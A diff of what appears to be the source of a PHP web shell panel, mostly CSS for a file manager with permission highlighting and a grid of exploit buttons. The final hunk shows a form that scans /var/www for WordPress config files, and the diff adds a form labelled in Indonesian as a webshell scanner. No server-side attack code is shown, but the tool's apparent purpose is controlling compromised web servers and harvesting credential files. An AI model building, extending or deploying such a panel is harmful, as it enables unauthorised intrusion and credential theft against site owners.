 .file-table-wrap{overflow:auto;max-height:540px;border-radius:5px;background:rgba(0,0,0,.5)}
 table{width:100%;border-collapse:collapse;font-size:12px}
 th,td{padding:5px 7px;border-bottom:1px solid rgba(100,0,50,.5);text-align:left;vertical-align:middle}
@@ -1391,7 +1448,6 @@ tr:hover td{background:rgba(100,0,50,.35)}
 .size-cell{color:#ddb0c8;font-size:10px;white-space:nowrap;text-shadow:0 0 3px #000}
 .action-cell{white-space:nowrap}
 .action-cell .btn{margin:2px 1px}
-
 .perm-danger{color:#ff4466 !important;text-shadow:0 0 6px rgba(255,68,102,.6),0 0 3px #000}
 .dir.perm-danger,.file.perm-danger{color:#ff6080 !important}
 .perm-safe{color:#44ff88 !important;text-shadow:0 0 6px rgba(68,255,136,.6),0 0 3px #000}
@@ -1401,14 +1457,11 @@ tr:hover td{background:rgba(100,0,50,.35)}
 .perm-locked{color:#cc77ff !important;text-shadow:0 0 6px rgba(204,119,255,.6),0 0 3px #000}
 .dir.perm-locked,.file.perm-locked{color:#dd99ff !important}
 .perm-unknown{color:#aaa !important}
-
 .legend{display:flex;gap:10px;flex-wrap:wrap;font-size:10px;color:#cc99b8;
-  padding:7px 12px;border-top:1px solid rgba(100,0,50,.5);
-  background:rgba(25,0,20,.85);text-shadow:0 0 3px #000}
+  padding:7px 12px;border-top:1px solid rgba(100,0,50,.5);background:rgba(25,0,20,.85);text-shadow:0 0 3px #000}
 .legend .dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:3px}
 .dot-danger{background:#ff4466}.dot-safe{background:#44ff88}
 .dot-warn{background:#ffdd55}.dot-locked{background:#cc77ff}
-
 label{display:block;color:#ff7090;font-size:10px;margin-bottom:4px;margin-top:7px;text-shadow:0 0 3px #000}
 input[type=text],input[type=password],input[type=email],textarea,select{
   width:100%;padding:7px 10px;background:rgba(35,0,40,.9);border:1px solid rgba(160,0,80,.7);border-radius:5px;
@@ -1419,7 +1472,6 @@ textarea{resize:vertical;min-height:90px}
 .row>input,.row>select{flex:1;min-width:120px}
 .row .btn{flex:0 0 auto}
 input[type=file]{padding:7px;background:rgba(35,0,40,.9);border:1px dashed rgba(160,0,80,.7);border-radius:5px;color:#ffcce0;font-size:11px;width:100%}
-
 .exp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
 .exp-btn{padding:11px 10px;background:linear-gradient(135deg, rgba(40,0,50,.88), rgba(20,0,30,.9));
   border:1px solid rgba(160,0,90,.7);border-radius:7px;color:#ffdde8;cursor:pointer;font-family:inherit;
@@ -1440,13 +1492,10 @@ input[type=file]{padding:7px;background:rgba(35,0,40,.9);border:1px dashed rgba(
 .exp-btn.gs{background:linear-gradient(135deg, rgba(40,0,50,.88), rgba(25,0,30,.9));border-color:#cc00cc;color:#ffddff}
 .exp-btn.gs .icon{color:#ff66ff}
 .exp-btn.gs:hover{background:linear-gradient(135deg, rgba(80,0,90,.92), rgba(45,0,55,.92));border-color:#ff44ff;box-shadow:0 0 16px rgba(255,68,255,.6)}
-
 .alert{padding:10px 13px;border-radius:7px;margin-bottom:12px;font-size:12px;line-height:1.5;
-  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
-  text-shadow:0 0 3px #000;box-shadow:0 0 12px rgba(0,0,0,.4)}
+  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);text-shadow:0 0 3px #000;box-shadow:0 0 12px rgba(0,0,0,.4)}
 .alert.info{background:linear-gradient(135deg, rgba(0,50,55,.75), rgba(0,25,30,.82));border:1px solid #00b0b0;color:#aaffff}
 .alert.warn{background:linear-gradient(135deg, rgba(55,40,0,.75), rgba(25,18,0,.82));border:1px solid #ffaa00;color:#ffee88}
-
 .modal{display:none;position:fixed;inset:0;z-index:100;background:rgba(5,0,10,.88);
   backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
   align-items:center;justify-content:center;padding:16px;animation:fadeIn .2s}
@@ -1472,16 +1521,11 @@ input[type=file]{padding:7px;background:rgba(35,0,40,.9);border:1px dashed rgba(
   border:1px solid rgba(160,0,80,.7);border-radius:5px;padding:10px;font-family:'Courier New',monospace;
   font-size:12px;outline:none;resize:vertical;line-height:1.5}
 .edit-textarea:focus{border-color:#ff2a5f;box-shadow:0 0 14px rgba(255,0,60,.5)}
-
-footer{
-  position:fixed;bottom:0;left:0;right:0;z-index:3;
+footer{position:fixed;bottom:0;left:0;right:0;z-index:3;
   background:linear-gradient(180deg,rgba(15,0,20,.95),rgba(8,0,12,.97));
   backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
   border-top:1px solid rgba(160,0,80,.7);padding:6px 12px;color:#b07090;font-size:10px;
-  display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;
-  text-shadow:0 0 3px #000
-}
-
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;text-shadow:0 0 3px #000}
 @media(max-width:700px){
   .wrap{padding:7px}
   header{padding:8px 10px}
@@ -1774,6 +1818,11 @@ footer{
       <input type="hidden" name="csrf" value="<?=$csrf?>">
       <label>FIND CONFIG FILES</label>
       <div class="row"><input type="text" name="root" value="/var/www"><button class="btn cyan" type="submit" name="tools_act" value="find_wp">🔎 SCAN</button></div>
+    </form>
+    <form method="post" style="margin-top:12px">
+      <input type="hidden" name="csrf" value="<?=$csrf?>">
+      <label>WEBSHELL SCANNER (scan backdoor PHP di seluruh website)</label>
+      <div class="row"><input type="text" name="scan_root" value="<?=h($_SERVER['DOCUMENT_ROOT'] ?? '')?>" placeholder="kosong = home website"><button class="btn green" type="submit" name="tools_act" value="shell_scan">🔍 SCAN WEBSHELL</button></div>
     </form>
     <?php if ($tools_result !== ''): ?>
       <?php if (strpos($tools_result, '<div') === 0): ?><div style="margin-top:12px"><?=$tools_result?></div>
